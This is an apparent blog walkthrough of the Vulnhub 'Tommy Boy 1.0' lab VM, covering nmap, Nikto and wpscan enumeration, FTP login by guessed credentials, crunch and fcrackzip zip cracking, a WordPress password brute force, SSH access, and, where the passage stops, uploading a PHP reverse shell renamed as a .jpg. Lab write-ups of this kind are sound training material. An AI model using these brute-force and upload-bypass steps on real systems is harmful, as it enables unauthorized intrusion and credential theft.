---
layout: post
title:  "Vulnhub - Tommy Boy 1.0"
date:   2016-09-14 15:07:19
categories: [walkthrough]
comments: false
---
So I came across [Tommy Boy 1.0](https://www.vulnhub.com/series/tommy-boy,91/) and I was a fan of the movie and it sounded fun, I decided to give it a go.  It was quite fun really enjoyed it, especially all the trolls in it.

Big thanks to Brian Johnson for making it and helping me waste several hours of my life on it.
<!--more-->

## Plot

HOLY SCHNIKES! Tommy Boy needs your help!

The Callahan Auto company has finally entered the world of modern technology and stood up a Web server for their customers to use for ordering brake pads.

Unfortunately, the site just went down and the only person with admin credentials is Tom Callahan Sr. - who just passed away! And to make matters worse, the only other guy with knowledge of the server just quit!

You'll need to help Tom Jr., Richard and Michelle get the Web page restored again. Otherwise Callahan Auto will most certainly go out of business :-(

Objective: The primary objective is to restore a backup copy of the homepage to Callahan Auto's server. However, to consider the box fully pwned, you'll need to collect 5 flags strewn about the system, and use the data inside them to unlock one final message.

So downloaded the VM, got it up and running setup on the same network as my Kali box, off to the races.

## Host Discovery

Starting this off lets find the system, I know its on my NAT interface so eth0 and the IP range.

{% highlight bash %}
root@kali:~/evidence/tommyboy1.0# netdiscover -i eth0

 Currently scanning: 192.168.87.0/16   |   Screen View: Unique Hosts                                 

 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120                                     
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.244.160 00:0c:29:06:3a:a2      1      60  VMware, Inc.                                      

root@kali:~/evidence/tommyboy1.0# -
{% endhighlight %}

Ok, it came up as `192.168.244.160`.  Off to enumeration.

## Host Enumeration

I started off using nmap with a full port and service scan as usual.

{% highlight bash %}
root@kali:~/evidence/tommyboy1.0# nmap -sV 192.168.244.160 -p 0-65535

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-20 14:45 MDT
Nmap scan report for 192.168.244.160
Host is up (0.000087s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu1 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
8008/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
MAC Address: 00:0C:29:06:3A:A2 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.06 seconds
root@kali:~/evidence/tommyboy1.0#
{% endhighlight %}

Looks like we have little to look at on a network level.  SSH and two web servers.

## TCP/80 - Callahan Auto Website

Next I opened up a browser while I ran a Nikto scan on the server in the background.  

![tcp80-index-php](/img/tommyboy/tcp80/index.php.png)

Ok there is the alert that was refered to in the object that the site is down.  No good.  Lets check the nikto scan:

{% highlight bash %}
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.244.151
+ Target Hostname:    192.168.244.151
+ Target Port:        80
+ Start Time:         2016-09-01 16:26:10 (GMT-6)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0x498 0x5371fb88ff1d8
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ OSVDB-3268: /webcgi/: Directory indexing found.
+ OSVDB-3268: /cgi/: Directory indexing found.
+ OSVDB-3268: /cgi-bin/: Directory indexing found.
+ OSVDB-3268: /cgi-sys/: Directory indexing found.
+ OSVDB-3268: /cgibin/: Directory indexing found.
+ OSVDB-3268: /cgi-win/: Directory indexing found.
+ OSVDB-3268: /fcgi-bin/: Directory indexing found.
+ OSVDB-3268: /cgi-exe/: Directory indexing found.
+ Entry '/6packsofb...soda' in robots.txt returned a non-forbidden or redirect HTTP code (301)
+ OSVDB-3268: /lukeiamyourfather/: Directory indexing found.
+ Entry '/lukeiamyourfather/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ OSVDB-3268: /lookalivelowbridge/: Directory indexing found.
+ Entry '/lookalivelowbridge/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ Entry '/flag-numero-uno.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
+ "robots.txt" contains 4 entries which should be manually viewed.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
... tons of false positive tr0lls ...
+ 14027 requests: 0 error(s) and 348 item(s) reported on remote host
+ End Time:           2016-09-01 16:26:31 (GMT-6) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
{% endhighlight %}

After looking through the Nikto there seemed to be a ton of false positives.  I went ahead and saved the full scan but ignored alot of the garbage.  And look at that, the robots.txt file held some juicy data.

{% highlight html %}
User-agent: *
Disallow: /6packsofb...soda
Disallow: /lukeiamyourfather
Disallow: /lookalivelowbridge
Disallow: /flag-numero-uno.txt
{% endhighlight %}

http://192.168.244.160/6packsofb...soda/6packsofsoda.jpg contained an amusing image:

![6packofsoda](/img/tommyboy/tcp80/6packsofsoda.jpg)

http://192.168.244.160/lukeiamyourfather/tmf.jpg was another image from the movie:

![tmf](/img/tommyboy/tcp80/tmf.jpg)

http://192.168.244.160/lookalivelowbridge/scream.jpg another image of tommyboy

![scream](/img/tommyboy/tcp80/scream.jpg)

And last, but not least the first flag!

{% highlight html %}
This is the first of five flags in the Callhan Auto server.  You'll need them all to unlock
the final treasure and fully consider the VM pwned!

Flag data: B34rcl4ws
{% endhighlight %}

I looked through the images with exiftool and binwalk but nothing of interest there.  Last up before moving onto the other system I looked at the HTML source code.

{% highlight html %}
<html>
<title>Welcome to Callahan Auto</title>
<body>
<H1><center>Welcome to Callahan Auto!</center></H1>
<font color="FF3339"><H2>SYSTEM ERROR!</H2></font>
If your'e reading this, the Callahan Auto customer ordering system is down.  Please restore the backup copy immediately.
<p>
See Nick in IT for assistance.
</html>
<!--Comment from Nick: backup copy is in Big Tom's home folder-->
<!--Comment from Richard: can you give me access too? Big Tom's the only one w/password-->
<!--Comment from Nick: Yeah yeah, my processor can only handle one command at a time-->
<!--Comment from Richard: please, I'll ask nicely-->
<!--Comment from Nick: I will set you up with admin access *if* you tell Tom to stop storing important information in the company blog-->
<!--Comment from Richard: Deal.  Where's the blog again?-->
<!--Comment from Nick: Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It's here if you don't remember: https://www.youtube.com/watch?v=VUxOd4CszJ8-->
<!--Comment from Richard: Ah! How could I forget?  Thanks-->
{% endhighlight %}

Some gems in there!  Both comedic and hacking related.   Went to the [youtube](https://www.youtube.com/watch?v=VUxOd4CszJ8) video above and it was the PrehistoricForest Scene.  Quality.

## TCP/80 - /PrehistoricForest

Ok this had a ton of gems on it, and shows as a wordpress site.  First off launch a wpscan and see if we get anything.

{% highlight bash %}
root@kali:~/evidence/tommyboy1.0# wpscan --url http://192.168.244.160/prehistoricforest/ --enumerate u --enumerate p
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.1
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.244.160/prehistoricforest/
[+] Started: Tue Sep 20 16:04:02 2016

[!] The WordPress 'http://192.168.244.160/prehistoricforest/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://192.168.244.160/prehistoricforest/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[+] XML-RPC Interface available under: http://192.168.244.160/prehistoricforest/xmlrpc.php
[!] Includes directory has directory listing enabled: http://192.168.244.160/prehistoricforest/wp-includes/

[+] WordPress version 4.5.4 identified from advanced fingerprinting (Released on 2016-09-07)

[+] WordPress theme in use: twentysixteen - v1.2

[+] Name: twentysixteen - v1.2
 |  Location: http://192.168.244.160/prehistoricforest/wp-content/themes/twentysixteen/
 |  Readme: http://192.168.244.160/prehistoricforest/wp-content/themes/twentysixteen/readme.txt
[!] The version is out of date, the latest version is 1.3
 |  Style URL: http://192.168.244.160/prehistoricforest/wp-content/themes/twentysixteen/style.css
 |  Theme Name: Twenty Sixteen
 |  Theme URI: https://wordpress.org/themes/twentysixteen/
 |  Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthe...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating installed plugins (only ones marked as popular) ...

   Time: 00:00:02 <=============================================> (1000 / 1000) 100.00% Time: 00:00:02

[+] We found 1 plugins:

[+] Name: akismet
 |  Latest version: 3.2
 |  Location: http://192.168.244.160/prehistoricforest/wp-content/plugins/akismet/

[!] We could not determine a version so all vulnerabilities are printed out

[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8215
    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
[i] Fixed in: 3.1.5

[+] Enumerating usernames ...
[+] Identified the following 4 user/s:
    +----+----------+-------------------+
    | Id | Login    | Name              |
    +----+----------+-------------------+
    | 1  | richard  | richard           |
    | 2  | tom      | Big Tom           |
    | 3  | tommy    | Tom Jr.           |
    | 4  | michelle | Michelle Michelle |
    +----+----------+-------------------+

[+] Finished: Tue Sep 20 16:04:08 2016
[+] Requests Done: 1062
[+] Memory used: 83.777 MB
[+] Elapsed time: 00:00:05
root@kali:~/evidence/tommyboy1.0# -
{% endhighlight %}

Some great stuff there, 4 users enumerated, wordpress version, and a potential XSS vulnerability.

Due to the amount of posts on the home page I've elected to show them one at a time in code.

{% highlight html %}
URL: http://192.168.244.160/prehistoricforest/index.php/2016/07/07/son-of-a/#comments

July 7, 2016 - Tom Jr. -
  Richard, what’s the password you put on that protected blog post?

July 7, 2016 - richard -
  Hey numbnuts, look at the /richard folder on this server. I’m sure that picture will jog your memory.
  Since you have a small brain: see up top in the address bar thingy? Erase “/prehistoricforest” and put “/richard” there instead.

{% endhighlight %}  

Excellent will look in `/richard` later.

{% highlight html %}
URL: http://192.168.244.160/prehistoricforest/index.php/2016/07/06/status-of-restoring-company-home-page/
July 6, 2016 - richard -
  Protected Content, password required
{% endhighlight %}  

Ok, some password protected content, will keep looking.

{% highlight html %}
URL: http://192.168.244.160/prehistoricforest/index.php/2016/07/06/sad-company-news/
July 6, 2016 - richard -
  I am deeply saddened to report that our company’s president, Tom Callahan, has passed away.

  I’ ve been informed that while this blog appears to be working fine, the main site where customers place orders is down.  I will be working with Michelle and Tommy to restore this ASAP.

  Thanks for your patience in this matter.

  Sincerely,

  Richard
{% endhighlight %}

Good content here, nothing for hacking though.

{% highlight html %}
URL: http://192.168.244.160/prehistoricforest/index.php/2016/07/06/hello-from-the-numbers-guy/
July 6, 2016 - richard

  Hey everybody,

  Richard here.  Just reminding everybody to get their expense reports and receipts to me by the end of each week *IF* you like getting paid.

  Really, this is just a reminder for Tommy, who is a huge fat waste of space – HAHAHAHAHAAH!!!!

  -Richard

July 6, 2016 - Tom Jr.
  SHUT UP RICHARD!!!!

July 6, 2016 - richard
  Hahaha, I actually *heard* you getting fatter while you typed that!
{% endhighlight %}  

Heh ok. That post was useless.  But hilarious!

{% highlight html %}
URL: http://192.168.244.160/prehistoricforest/index.php/2016/07/06/announcing-the-callahan-internal-company-blog/
July 6, 2016 - Big Tom
  Hey everybody,

  Big Tom here.  Richard said I should try to get into this century and try one of these frickin’ new-fangled computers or whatever.  I hate it.  This will be my first and last post.

  Bye.

  Wait…do we have an edit button on this thing?

  Richard are you there?

  OH wait, you told me this wasn’t a chat program.  I forgot.

  -Big Tom

July 7, 2016 - Michelle Michelle
  Well put boss 😉
  Flag #2: thisisthesecondflagyayyou.txt
{% endhighlight %}

Excellent the second flag!  Looking at `/prehistoricforest/thisisthesecondflagyayyou.txt` the following was discovered.  Also ironic that Michelle told her boss congrats after he died.  Heh.

{% highlight html %}
You've got 2 of five flags - keep it up!

Flag data: Z4l1nsky
{% endhighlight %}

Ok lets follow up that `/richard` lead.   In that folder we find one image file:

![shockedrichard](/img/tommyboy/tcp80/shockedrichard.jpg)

Decided to do my usual and check it with exiftool and binwalk, and much to my delight there was a hash in the user comments.  ce154b5a8e59c89732bc25d6a2e6b90b  Ran that through [hashkiller](hashkiller.co.uk) and got spanky.  Hah the excellent theming continues.  And we also have a password to the protected section.

Going back to

{% highlight html %}
Michelle/Tommy,

This is f’d up.

I am currently working to restore the company’s online ordering system, but we are having some problems getting it restored from backup.  Unfortunately, only Big Tom had the passwords to log into the system.  I can’t find his passwords anywhere.  All I can find so far is a note from our IT guy Nick (whose last day was yesterday) saying:

Hey Richy,

So you asked me to do a write-up of everything I know about the Callahan server so the next moron who is hired to support you idiots can get up to speed faster.

Here’s everything I know:

    You guys are all hopeless sheep :-/
    The Callahan Auto Web site is usually pretty stable.  But if for some reason the page is ever down, you guys will probably go out of business.  But, thanks to *me* there’s a backup called callahanbak.bak that you can just rename to index.html and everything will be good again.
        IMPORTANT: You have to do this under Big Tom’s account via SSH to perform this restore.  Warning: Big Tom always forgets his account password.  Warning #2: I screwed up his system account when I created it on the server, so it’s not called what it should be called.  Eh, I can’t remember (don’t care) but just look at the list of users on the system and you’ll figure it out.

    I left a few other bits of information in my home folder, which the new guy can access via FTP.  Oh, except I should mention that the FTP server is super flaky and I haven’t had the time (i.e. I don’t give a fat crap) to fix it.  Basically I couldn’t get it running on the standard port, so I put it on a port that most scanners would get exhausted looking for.  And to make matters more fun, the server seems to go online at the top of the hour for 15 minutes, then down for 15 minutes, then up again, then down again.  Now it’s somebody else’s problem (did I mention I don’t give a rat’s behind?).

    You asked me to leave you with my account password for the server, and instead of laughing in your face (which is what I WANTED to do), I just reset my account (“nickburns” in case you’re dumb and can’t remember) to a very, VERY easy to guess password.  I removed my SSH access because I *DON’T* want you calling me in case of an emergency.  But my creds still work on FTP.  Your new fresh fish can connect using my credentials and if he/she has half a brain.

Good luck, schmucks!

LOL

-Nick

Michelle/Tommy…WTF are we going to do?!?!  If this site stays down, WE GO OUT OF BUSINESS!!!1!!1!!!!!!!

-Richard
{% endhighlight %}

Ok there was a lot there.  Other than Eric possibly being bofh but there are two big pieces of info.

* Eric's home folder is available via FTP
* FTP goes down for 15 minutes every 15 minutes
* Eric's account is nickburns and his password is super simple.
* FTP is on a non standard high port

## FTP Access

Ok let try to gain access to Eric's FTP account.  First off lets do an nmap on high ports to find the FTP server.

{% highlight bash %}
root@kali:~/blog/img/tommyboy/tcp80# nmap 192.168.244.160 -p 10000-65535

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-20 15:56 MDT
Nmap scan report for 192.168.244.160
Host is up (0.00017s latency).
Not shown: 55535 closed ports
PORT      STATE SERVICE
65534/tcp open  unknown
MAC Address: 00:0C:29:06:3A:A2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.75 seconds
root@kali:~/blog/img/tommyboy/tcp80#
{% endhighlight %}

After trying `password` and failing the next simple password I could think of was using the username.  But OF COURSE the timer hit and I was not able to connect.  Now to wait 15 minutes.  

While I waited I went ahead and looked around a bit more, ran dirb on prehistoricforest and a couple of enumerations.  None of which yielded any fruit.

{% highlight bash %}
root@kali:~/evidence/tommyboy/tcp65534# ftp 192.168.244.160 65534
Connected to 192.168.244.160.
220 Callahan_FTP_Server 1.3.5
Name (192.168.244.160:root): nickburns
331 Password required for nickburns
Password: nickburns
230 User nickburns logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxr-x---   4 nickburns nickburns     4096 Jul 20 20:42 .
drwxr-x---   4 nickburns nickburns     4096 Jul 20 20:42 ..
-rw-r--r--   1 root     root            0 Jul 21 22:47 .bash_history
drwx------   2 nickburns nickburns     4096 Jul  6 22:37 .cache
drwxrwxr-x   2 nickburns nickburns     4096 Jul  6 22:37 .nano
-rw-rw-r--   1 nickburns nickburns      977 Jul 15 02:37 readme.txt
226 Transfer complete
ftp> get readme.txt
local: readme.txt remote: readme.txt
200 PORT command successful
150 Opening BINARY mode data connection for readme.txt (977 bytes)
226 Transfer complete
977 bytes received in 0.00 secs (2.1224 MB/s)
ftp> cd .nano
250 CWD command successful
ftp> ls -al
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 nickburns nickburns     4096 Jul  6 22:37 .
drwxr-x---   4 nickburns nickburns     4096 Jul 20 20:42 ..
226 Transfer complete
ftp> cd ..
250 CWD command successful
ftp> cd .cache
250 CWD command successful
ftp> ls -al
200 PORT command successful
150 Opening ASCII mode data connection for file list
drwx------   2 nickburns nickburns     4096 Jul  6 22:37 .
drwxr-x---   4 nickburns nickburns     4096 Jul 20 20:42 ..
-rw-r--r--   1 nickburns nickburns        0 Jul  6 22:37 motd.legal-displayed
226 Transfer complete
ftp> exit
221 Goodbye.
root@kali:~/evidence/tommyboy/tcp65534# -
{% endhighlight %}

Ok found and downloaded a readme.txt file from Nick's FTP which contained the following:

{% highlight text %}
To my replacement:

If you're reading this, you have the unfortunate job of taking over IT responsibilities
from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You'll be
surrounded by stupid monkeys all day who can barely hit Ctrl+P and wouldn't know a fax machine
from a flame thrower!

Anyway I'm not completely without mercy.  There's a subfolder called "NickIzL33t" on this server
somewhere. I used it as my personal dropbox on the company's dime for years.  Heh. LOL.
I cleaned it out (no naughty pix for you!) but if you need a place to dump stuff that you want
to look at on your phone later, consider that folder my gift to you.

Oh by the way, Big Tom's a moron and always forgets his passwords and so I made an encrypted
.zip of his passwords and put them in the "NickIzL33t" folder as well.  But guess what?
He always forgets THAT password as well.  Luckily I'm a nice guy and left him a hint sheet.

Good luck, schmuck!

LOL.

-Nick
{% endhighlight %}

More proof Nick=bohf.  But at least he mentioned there is a folder `NickIzL33t` that contains Big Tom's passwords as an encrypted zip file, and a hint for that password.  Layers of "security" I guess heh.

## TCP/8008 - Naughy Nick's Dropbox

Accessing Nick's dropbox basically tells you to go away, but it gives an important clue when coupled with the previous comment of `look at on your phone later`.

{% highlight html %}
<H1>Nick's sup3r s3cr3t dr0pb0x - only me and Steve Jobs can see this content</H1><H2>Lol</H2>
{% endhighlight %}

Time to change our user-agent to something more iphoneish.  I used "User-Agent Switcher" for firefox and switched to an apple device.  The content then changed to the following:

{% highlight html %}
<html>
<title>Congrats, genius</title>
<h1>Well, you passed the dummy test</h1>
<h2>But Nick's secret door isn't that easy to open.</h2>
<h3>Gotta know the EXACT name of the .html to break into this fortress.</h3>
<h4>Good luck brainiac.</h4>
<h5>Lol</h5>
-Nick
</html>
{% endhighlight %}

More taunts from the bofh.  First off he mentioned a hint.  Quick check to see if hint.txt exists at `/NickIzL33t/hint.txt`.

{% highlight html %}
Big Tom,

Your password vault is protected with (yep, you guessed it) a PASSWORD!  
And because you were choosing stupidiculous passwords like "password123" and "brakepad" I
enforced new password requirements on you...13 characters baby! MUAHAHAHAHAH!!!

Your password is your wife's nickname "bev" (note it's all lowercase) plus the following:

* One uppercase character
* Two numbers
* Two lowercase characters
* One symbol
* The year Tommy Boy came out in theaters

Yeah, fat man, that's a lot of keys to push but make sure you type them altogether in one
big chunk ok?  Heh, "big chunk."  A big chunk typing big chunks.  That's funny.

LOL

-Nick
{% endhighlight %}

Excellent, well it gave us a couple of crappy passwords to add to our wordlist, and the construction of big tom's password! I sense `crunch` in our future. I also went ahead and fired off a dirb attack against the site to see if I could find anything else in the folder.  I started off with the small dirbuster list but that found nothing.  The medium dirbuster list failed as well in dirb, so I switched tools to dirbuster and Success! `fallon1.html` exists.  

Looking at the content of that results in:

{% highlight html %}
<html>
<title>W 0 W!</title>
Nice work.  Here are the goodies in Nick's personal super secret dropbox:
<p>
<ul>
<li><a href="hint.txt">A hint</a> - you'll need it
<li><a href="flagtres.txt">The third flag</a> - you're not hopeless after all
<li><a href="t0msp4ssw0rdz.zip">Big Tom's encrypted pw backups</a> - because that big tub of dumb can never remember them
</ul>
<!--Note: Still working on file upload capabilities in the P4TCH_4D4MS folder-->
</html>
{% endhighlight %}

Excellent, 4 good things.

* link to the hint.txt file we previously found
* link to the third flag!
* link to tom's encrypted password backups
* hidden note about P4TCH_4D4MS folder, that sounds interesting...

{% highlight bash %}
THREE OF 5 FLAGS - you're awesome sauce.

Flag data: TinyHead
{% endhighlight %}

## Crunch time!

Ok time to crack the zip password, for this we are going to use crunch to generate a custom database based on the parameters provided by Nick.

We're looking for a 13 character password that starts with `bev`,upper case letter, two numbers, two lowercase letters, a symbol, and 1995 the year Tommy Boy came out.

{% highlight bash %}
root@kali:~/evidence/tommyboy1.0# crunch 13 13 -t bev,%%@@^1995 -o tommy.txt
Crunch will now generate the following amount of data: 812011200 bytes
774 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 58000800

crunch:  79% completed generating output

crunch: 100% completed generating output
root@kali:~/evidence/tommyboy1.0# mv ~/Downloads/t0msp4ssw0rdz.zip .
root@kali:~/evidence/tommyboy1.0# ls
t0msp4ssw0rdz.zip  tommy.txt
root@kali:~/evidence/tommyboy1.0# fcrackzip -v -D -u -p tommy.txt t0msp4ssw0rdz.zip
found file 'passwords.txt', (size cp/uc    332/   641, flags 9, chk 9aad)
checking pw bevG72kn~1995                           

PASSWORD FOUND!!!!: pw == bevH00tr$1995
root@kali:~/evidence/tommyboy1.0# -
{% endhighlight %}

Hahaha, ok quality password, and something the bofh would do so I approve.  Lets open up that zip.

{% highlight bash %}
root@kali:~/evidence/tommyboy1.0# unzip t0msp4ssw0rdz.zip
Archive:  t0msp4ssw0rdz.zip
[t0msp4ssw0rdz.zip] passwords.txt password: bevH00tr$1995
  inflating: passwords.txt           
root@kali:~/evidence/tommyboy1.0# cat passwords.txt
Sandusky Banking Site
------------------------
Username: BigTommyC
Password: money

TheKnot.com (wedding site)
---------------------------
Username: TomC
Password: wedding

Callahan Auto Server
----------------------------
Username: bigtommysenior
Password: fatguyinalittlecoat

Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.

Callahan Company Blog
----------------------------
Username: bigtom(I think?)
Password: ???
Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
root@kali:~/evidence/tommyboy1.0# -
{% endhighlight %}

Hah great bunch of passords, but sadly I don't have use for the banking or wedding sites.   So we have been provided two clues:

* Auto Server bigtommysenior:fatguyinalittlecoat???? - numbers available in blog
* Blog server tom:(some queen song) - note he got his username wrong there, we discovered it was tom via the wpscan earlier.

Well I ran around a bit trying to figure out the Famous Queen song and it finally hit me [famous queen song](https://www.youtube.com/watch?v=qGaOlfmX8rQ).  So off to brute with wpscan against the rockyou database.  But as thats a huge list and Eric kept saying tom had horrible passwords I decided to grep for tom and see if he uses his name in his password.  And almost immediately like magic I rocked it.

{% highlight bash %}
root@kali:~/evidence/tommyboy1.0# cat /usr/share/wordlists/rockyou.txt | grep tom > tomrockyou.txt
root@kali:~/evidence/tommyboy1.0# wpscan --url http://192.168.244.160/prehistoricforest/ --wordlist /root/evidence/tommyboy1.0/tomrockyou.txt --username tom
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.1
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: http://192.168.244.160/prehistoricforest/
[+] Started: Tue Sep 20 16:38:16 2016

[!] The WordPress 'http://192.168.244.160/prehistoricforest/readme.html' file exists exposing a version number
[+] Interesting header: LINK: <http://192.168.244.160/prehistoricforest/wp-json/>; rel="https://api.w.org/"
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[+] XML-RPC Interface available under: http://192.168.244.160/prehistoricforest/xmlrpc.php
[!] Includes directory has directory listing enabled: http://192.168.244.160/prehistoricforest/wp-includes/

[+] WordPress version 4.5.4 identified from advanced fingerprinting (Released on 2016-09-07)

[+] WordPress theme in use: twentysixteen - v1.2

[+] Name: twentysixteen - v1.2
 |  Location: http://192.168.244.160/prehistoricforest/wp-content/themes/twentysixteen/
 |  Readme: http://192.168.244.160/prehistoricforest/wp-content/themes/twentysixteen/readme.txt
[!] The version is out of date, the latest version is 1.3
 |  Style URL: http://192.168.244.160/prehistoricforest/wp-content/themes/twentysixteen/style.css
 |  Theme Name: Twenty Sixteen
 |  Theme URI: https://wordpress.org/themes/twentysixteen/
 |  Description: Twenty Sixteen is a modernized take on an ever-popular WordPress layout — the horizontal masthe...
 |  Author: the WordPress team
 |  Author URI: https://wordpress.org/

[+] Enumerating plugins from passive detection ...
[+] No plugins found
[+] Starting the password brute forcer
  [+] [SUCCESS] Login : tom Password : tomtom1                                                        

  Brute Forcing 'tom' Time: 00:00:01 <                            > (52 / 22683)  0.22%  ETA: 00:08:37
  +----+-------+------+----------+
  | Id | Login | Name | Password |
  +----+-------+------+----------+
  |    | tom   |      | tomtom1  |
  +----+-------+------+----------+

[+] Finished: Tue Sep 20 16:38:20 2016
[+] Requests Done: 95
[+] Memory used: 16.016 MB
[+] Elapsed time: 00:00:03
root@kali:~/evidence/tommyboy1.0# -
{% endhighlight %}

Off to login to the WordPress site and look around.  Sadly it was quite secured (no easy shellz for me).  But I did find this GEM of a post in the drafts.

{% highlight bash %}
Ok so Nick always yells at me for forgetting the second part of my "ess ess eight (ache? H?) password so I'm writing it here:

1938!!

Nick, if you're reading this, I DON'T CARE IF I"M USING THIS THING AS A PASSWORD VAULT. YOU TOOK AWAY MY STICKIES SO I"LL PUT MY PASSWORDS ANY DANG PLACE I WANT.
{% endhighlight %}

Hahahha `ess ess eight`, quality.  So now we have his numbers `1938` which makes his credentials for ssh `bigtommysenior:fatguyinalittlecoat1938` and of course I get trolled, the '!!' is part of the password.

## ess ess eight access

{% highlight bash %}
root@kali:~/evidence/tommyboy1.0# ssh bigtommysenior@192.168.244.160
The authenticity of host '192.168.244.160 (192.168.244.160)' can't be established.
ECDSA key fingerprint is SHA256:bI4/w4tR6j1XRyuLkIs5icsyLJM0Kfw9m4iPFpXX0NI.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.244.160' (ECDSA) to the list of known hosts.
bigtommysenior@192.168.244.160's password:
Welcome to Ubuntu 16.04 LTS (GNU/Linux 4.4.0-31-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

183 packages can be updated.
69 updates are security updates.


Last login: Thu Jul 14 13:45:57 2016
bigtommysenior@CallahanAutoSrv01:~$ ls -al
total 40
drwxr-x--- 4 bigtommysenior bigtommysenior 4096 Jul  8 08:57 .
drwxr-xr-x 5 root           root           4096 Jul  7 00:17 ..
-rw------- 1 bigtommysenior bigtommysenior    0 Jul 21 17:47 .bash_history
-rw-r--r-- 1 bigtommysenior bigtommysenior  220 Jul  7 00:12 .bash_logout
-rw-r--r-- 1 bigtommysenior bigtommysenior 3771 Jul  7 00:12 .bashrc
drwx------ 2 bigtommysenior bigtommysenior 4096 Jul  7 00:16 .cache
-rw-r--r-- 1 bigtommysenior bigtommysenior  307 Jul  7 14:18 callahanbak.bak
-rw-rw-r-- 1 bigtommysenior bigtommysenior  237 Jul  7 15:27 el-flag-numero-quatro.txt
-rw-rw-r-- 1 bigtommysenior bigtommysenior  630 Jul  7 17:59 LOOT.ZIP
drwxrwxr-x 2 bigtommysenior bigtommysenior 4096 Jul  7 13:50 .nano
-rw-r--r-- 1 bigtommysenior bigtommysenior  675 Jul  7 00:12 .profile
-rw-r--r-- 1 bigtommysenior bigtommysenior    0 Jul  7 00:17 .sudo_as_admin_successful
bigtommysenior@CallahanAutoSrv01:~$ cat el-flag-numero-quatro.txt
YAY!  Flag 4 out of 5!!!! And you should now be able to restore the Callhan Web server to normal
working status.

Flag data: EditButton

But...but...where's flag 5?  

I'll make it easy on you.  It's in the root of this server at /5.txt
bigtommysenior@CallahanAutoSrv01:~$
{% endhighlight %}

Alright grabbed Flag 4 sweet and found the `callahanbak.bak` file.  Along with a LOOT.ZIP which requires all 5 flags.  Sweet so got the final target.

First things first!  Lets fix the server.

{% highlight bash %}
bigtommysenior@CallahanAutoSrv01:~$ cp callahanbak.bak /var/www/html/index.html
{% endhighlight %}

![fixed server](/img/tommyboy/tcp80/fixed-index.png)

Now to get the 5th flag and the loot.  Nick mentioned P4TCH_4D4MS lets see if that's in his dropbox.

{% highlight html %}
<!DOCTYPE html>
<html>
<body>

<form action="upload.php" method="post" enctype="multipart/form-data">
    Select image to upload:
    <input type="file" name="fileToUpload" id="fileToUpload">
    <input type="submit" value="Upload Image" name="submit">
</form>

</body>
</html>
{% endhighlight %}

Awesome, file to upload.  I went ahead and used a [php-reverse-shell](http://pentestmonkey.net/tools/php-reverse-shell) from pentest monkey, modified my host and port, renamed it to a .jpg and uploaded it and got greeted with:

{% highlight text %}
